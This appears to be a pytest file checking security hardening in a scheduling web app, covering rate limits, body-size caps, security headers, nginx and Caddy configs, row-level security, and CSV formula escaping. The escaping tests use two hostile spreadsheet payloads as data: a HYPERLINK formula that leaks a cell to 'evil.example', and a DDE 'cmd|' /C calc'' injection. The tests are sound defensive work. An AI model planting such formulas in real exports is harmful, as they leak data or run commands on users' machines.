"""W3-SEC hardening: rate limits on sign-in / reset / AI / uploads, the body-size fence, API security headers, CSV
formula escaping in every export, the proxy headers (nginx + Caddy) and the RLS hook being a no-op on SQLite."""

from __future__ import annotations

import ast
import re
from pathlib import Path

import pytest
from app.core import security_http as sh
from app.core.throttle import Throttle
from httpx import ASGITransport, AsyncClient

from tests.api_fixtures import client, login  # noqa: F401

BACKEND = Path(__file__).resolve().parent.parent
DEPLOY = BACKEND.parent / "deploy"
NGINX = (DEPLOY / "nginx/default.conf").read_text(encoding="utf-8")
CADDY = (DEPLOY / "caddy/Caddyfile").read_text(encoding="utf-8")

#: a real-looking hostile cell: an instructor name typed into the planning workbook
EVIL = '=HYPERLINK("http://evil.example/?"&A1;"Doç. Dr. İsmail Işık")'


@pytest.fixture
def limits(monkeypatch):  # type: ignore[no-untyped-def]
    monkeypatch.setattr(sh.LIMITS, "enforce_in_tests", True)
    sh.LIMITS.reset()
    yield sh.LIMITS
    sh.LIMITS.reset()


def _rule(name: str) -> sh.Rule:
    return next(r for r in sh.LIMITS.rules if r.name == name)


async def _public_client(addr: str = "203.0.113.7") -> AsyncClient:
    from app.main import app

    return AsyncClient(transport=ASGITransport(app=app, client=(addr, 41000)), base_url="http://test")


async def test_login_is_limited_per_client_address(client, limits, monkeypatch):  # type: ignore[no-untyped-def]  # noqa: F811
    monkeypatch.setattr(_rule("login"), "per_address", Throttle(300, 3))
    async with await _public_client() as c:
        for _ in range(3):
            r = await c.post("/api/v1/auth/login", json={"email": "admin@example.com", "password": "admin1234"})
            assert r.status_code == 200, r.text
        r = await c.post("/api/v1/auth/login", json={"email": "admin@example.com", "password": "admin1234"})
        assert r.status_code == 429
        assert int(r.headers["retry-after"]) >= 1
        body = r.json()["detail"]
        assert body["code"] == "rate_limited" and "dakika" in body["message_tr"]
    async with await _public_client("198.51.100.20") as other:  # another client is not affected
        r = await other.post("/api/v1/auth/login", json={"email": "admin@example.com", "password": "admin1234"})
        assert r.status_code == 200


async def test_proxy_hops_are_not_limited_per_address(client, limits, monkeypatch):  # type: ignore[no-untyped-def]  # noqa: F811
    """The Next.js route handler (Docker bridge address) speaks for every browser: never one shared bucket."""
    monkeypatch.setattr(_rule("login"), "per_address", Throttle(300, 1))
    async with await _public_client("172.18.0.5") as c:
        for _ in range(3):
            r = await c.post("/api/v1/auth/login", json={"email": "admin@example.com", "password": "admin1234"})
            assert r.status_code == 200
    assert sh.is_proxy_hop("127.0.0.1") and sh.is_proxy_hop("::1") and not sh.is_proxy_hop("10.20.30.40")


async def test_reset_confirm_is_limited_per_address(client, limits, monkeypatch):  # type: ignore[no-untyped-def]  # noqa: F811
    monkeypatch.setattr(_rule("reset_confirm"), "per_address", Throttle(900, 2))
    async with await _public_client() as c:
        codes = [
            (
                await c.post(
                    "/api/v1/auth/password-reset/confirm", json={"token": "x" * 20, "password": "Yeni-Parola-1"}
                )
            ).status_code
            for _ in range(3)
        ]
    assert codes == [400, 400, 429]


async def test_ai_routes_are_limited_per_user(client, limits, monkeypatch):  # type: ignore[no-untyped-def]  # noqa: F811
    monkeypatch.setattr(_rule("ai"), "per_user", Throttle(60, 2))
    h = await login(client)
    codes = [
        (await client.post("/api/v1/runs/999/chat", json={"message": "İ ı"}, headers=h)).status_code for _ in range(3)
    ]
    assert codes[:2] != [429, 429] and codes[2] == 429
    # a token that is not valid does not get a per-user bucket (and the route itself answers 401)
    r = await client.post("/api/v1/runs/999/chat", json={"message": "x"}, headers={"Authorization": "Bearer nope"})
    assert r.status_code == 401


async def test_uploads_are_limited_per_user(client, limits, monkeypatch):  # type: ignore[no-untyped-def]  # noqa: F811
    monkeypatch.setattr(_rule("upload"), "per_user", Throttle(600, 1))
    h = await login(client)
    files = {"file": ("liste.xlsx", b"PK\x03\x04 not really", "application/octet-stream")}
    first = await client.post("/api/v1/imports/planning-list", files=files, headers=h)
    assert first.status_code != 429
    second = await client.post("/api/v1/imports/planning-list", files=files, headers=h)
    assert second.status_code == 429


async def test_change_password_is_limited_per_user(client, limits, monkeypatch):  # type: ignore[no-untyped-def]  # noqa: F811
    monkeypatch.setattr(_rule("change_password"), "per_user", Throttle(900, 2))
    h = await login(client)
    body = {"current_password": "yanlış", "new_password": "Yeni-Parola-123"}
    codes = [(await client.post("/api/v1/auth/change-password", json=body, headers=h)).status_code for _ in range(3)]
    assert codes == [403, 403, 429]


async def test_body_size_fence_and_api_headers(client):  # type: ignore[no-untyped-def]  # noqa: F811
    r = await client.post(
        "/api/v1/auth/login",
        content=b"{}",
        headers={"content-type": "application/json", "content-length": str(sh.max_body_bytes() + 1)},
    )
    assert r.status_code == 413 and r.json()["detail"]["code"] == "too_large"
    r = await client.get("/api/v1/health")
    assert r.headers["x-content-type-options"] == "nosniff"
    assert r.headers["x-frame-options"] == "DENY"
    assert r.headers["referrer-policy"] == "strict-origin-when-cross-origin"


# ----------------------------------------------------------------------------------------- exports


def test_every_csv_writer_in_the_app_escapes_formulas() -> None:
    """Static guard: each ``csv.writer`` / ``csv.DictWriter`` of app/ is wrapped in ``safe_writer`` (export_safety)
    or the module escapes the cells itself (audit.py ``safe``)."""
    offenders = []
    for path in sorted((BACKEND / "app").rglob("*.py")):
        src = path.read_text(encoding="utf-8")
        if "csv.writer(" not in src and "csv.DictWriter(" not in src:
            continue
        rel = path.relative_to(BACKEND).as_posix()
        if rel in {"app/api/v1/audit.py", "app/core/export_safety.py", "app/importers/room_master.py"}:
            continue  # audit: own escaping (B9); room_master: an internal re-serialisation fed back to the importer
        for node in ast.walk(ast.parse(src)):
            if (
                isinstance(node, ast.Call)
                and isinstance(node.func, ast.Attribute)
                and node.func.attr in {"writer", "DictWriter"}
                and isinstance(node.func.value, ast.Name)
                and node.func.value.id == "csv"
            ):
                parent_ok = re.search(r"safe_writer\(\s*csv\." + node.func.attr + r"\(", src)
                if not parent_ok:
                    offenders.append(f"{rel}:{node.lineno}")
    assert offenders == []


def test_invigilation_load_csv_escapes_a_hostile_name() -> None:
    from app.services.invigilation import load_heatmap_csv

    data = {
        "rows": [
            {
                "person_key": "p1",
                "name": EVIL,
                "duties": 1,
                "periods": 2,
                "cells": [{"date": "2026-06-15", "duties": 1, "periods": 2}],
            }
        ]
    }
    out = load_heatmap_csv(data)
    assert "'=HYPERLINK" in out and "Doç. Dr. İsmail Işık" in out
    assert "\n=HYPERLINK" not in out and ",=HYPERLINK" not in out


def test_kvkk_export_csv_escapes_a_hostile_note() -> None:
    from app.services.kvkk import _csv

    out = _csv([{"id": 1, "note": "@SUM(1+1)*cmd|' /C calc'!A0", "title": "Ayşe Yılmaz"}])
    assert "'@SUM" in out and "Ayşe Yılmaz" in out


# ----------------------------------------------------------------------------------------- proxies


def test_nginx_security_headers_and_csrf_fence() -> None:
    for header in (
        "Content-Security-Policy $smartsched_csp",
        "Strict-Transport-Security $smartsched_hsts",
        "X-Frame-Options $smartsched_frame_options",
        "Permissions-Policy",
        "Referrer-Policy strict-origin-when-cross-origin",
        "X-Content-Type-Options nosniff",
    ):
        assert f"add_header {header}" in NGINX, header
    csp = re.search(r'""\s+"(default-src[^"]+)"', NGINX)
    assert csp is not None
    policy = csp.group(1)
    for directive in ("object-src 'none'", "base-uri 'self'", "frame-ancestors $smartsched_frame_ancestors"):
        assert directive in policy
    assert "'unsafe-eval'" not in policy
    assert re.search(r"~\^/grafana/\s+\"'self'\";", NGINX) and "default     \"'none'\";" in NGINX
    assert "if ($smartsched_cross_site_write) { return 403; }" in NGINX
    assert "$proxy_add_x_forwarded_for" not in NGINX  # a client-made X-Forwarded-For chain is never passed on
    assert "location = /.well-known/security.txt" in NGINX and "Expires: 2027-10-17" in NGINX
    assert "    location / {" in NGINX  # the pod CI renders /ci/ before this line


def test_caddy_edge_headers() -> None:
    assert 'Strict-Transport-Security "max-age=31536000; includeSubDomains"' in CADDY
    for name in ("X-Content-Type-Options", "Referrer-Policy", "X-Frame-Options", "Content-Security-Policy"):
        assert f"?{name} " in CADDY, name


# ----------------------------------------------------------------------------------------- RLS on SQLite


async def test_rls_hook_is_a_noop_on_sqlite(client):  # type: ignore[no-untyped-def]  # noqa: F811
    from app.core import db as dbmod
    from app.core import rls

    async with dbmod.get_session_factory()() as s:
        assert rls.applies(s) is False
        assert rls.context_of(s) is rls.SYSTEM
    h = await login(client)
    r = await client.get("/api/v1/me/notifications", headers=h)
    assert r.status_code == 200


def test_rls_context_settings() -> None:
    from app.core import rls

    class U:
        id, role = 7, "TEACHER"

    ctx = rls.user_context(U(), {"room.view", "book_single.create", "bad,perm'"})
    assert ctx.settings() == {
        "app.user_id": "7",
        "app.role": "TEACHER",
        "app.perms": "badperm,book_single.create,room.view",
        "app.system": "off",
    }
    assert rls.SYSTEM.settings()["app.system"] == "on" and rls.SYSTEM.settings()["app.user_id"] == ""


def test_rls_migration_is_a_noop_on_sqlite(tmp_path) -> None:  # type: ignore[no-untyped-def]
    from alembic import command

    from tests.test_crbs_migration import _run

    url = f"sqlite+aiosqlite:///{tmp_path}/rls.db"
    _run(url, command.upgrade, "0035_rls_policies")
    _run(url, command.downgrade, "0034_ai_usage")
    _run(url, command.upgrade, "head")
